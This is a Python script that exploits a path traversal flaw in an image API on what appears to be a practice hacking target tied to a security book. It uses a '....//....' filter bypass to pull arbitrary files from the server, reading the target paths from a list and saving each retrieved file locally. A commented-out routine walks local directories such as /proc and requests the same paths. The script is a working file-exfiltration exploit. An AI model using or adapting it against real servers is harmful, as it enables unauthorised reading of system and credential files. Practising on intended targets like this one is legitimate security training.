#!/usr/bin/env python3
import os, sys
import requests
from datetime import datetime
import logging

def handle_unhandled_exception(exc_type, exc_value, exc_traceback):
    """Handler for unhandled exceptions that will write to the logs"""
    if issubclass(exc_type, KeyboardInterrupt):
        logging.info('KeyboardInterrupt')
        # call the default excepthook saved at __excepthook__
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    logging.critical("Unhandled exception", exc_info=(exc_type, exc_value, exc_traceback))  

sys.excepthook = handle_unhandled_exception

down_dir = 'secu_down_' + str(datetime.now().strftime('%Y%m%d%H%M%S'))
log_name = down_dir + '.log'

logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler(log_name),
                              logging.StreamHandler()])

logging.info("log file name: " + log_name)

def getfile(name, check_dir = False):
    try:
        http_name = name.replace('/','//')
        r = requests.get("https://hackuj.ksiazka.sekurak.pl/api/get-image?id=....//...."+http_name,
            timeout=10)
        
        if check_dir == True:
            if 'illegal operation on a directory' in r.text:
                logging.info('dir ' + name + ' is ok')
                return True
            else:
                logging.error('dir ' + name + ' is not_ok')
                return False
        else:        
            logging.info(name +' ' + str(r.status_code))
            if r.status_code == 200:
                out_name = down_dir + name
                os.makedirs(os.path.dirname(out_name), exist_ok = True)
                with open(out_name, 'wb') as out:
                    out.write(r.content)

    except requests.ConnectionError:
        logging.error(name + ' ConnectionError')
    except requests.ReadTimeout:
        logging.error(name + ' ReadTimeout')       

def process_dir(name):
    try:
        with os.scandir(name) as it:
            for entry in it:
                if entry.is_file():
                    getfile(entry.path)
                elif entry.is_dir():
                    logging.info('dir ' + entry.path)
                    if not (entry.name[0].isdigit() and name == '/proc'):
                        if getfile(entry.path, check_dir=True):
                            process_dir(entry.path)
    except PermissionError:
        logging.error('process_dir ' + name + ' PermissionError')
    except FileNotFoundError:
        logging.error('process_dir ' + name + ' FileNotFoundError')




#process_dir('/proc')

with open("path.txt", "r") as f:
    content = f.read()
for line in content.splitlines():
    getfile(line)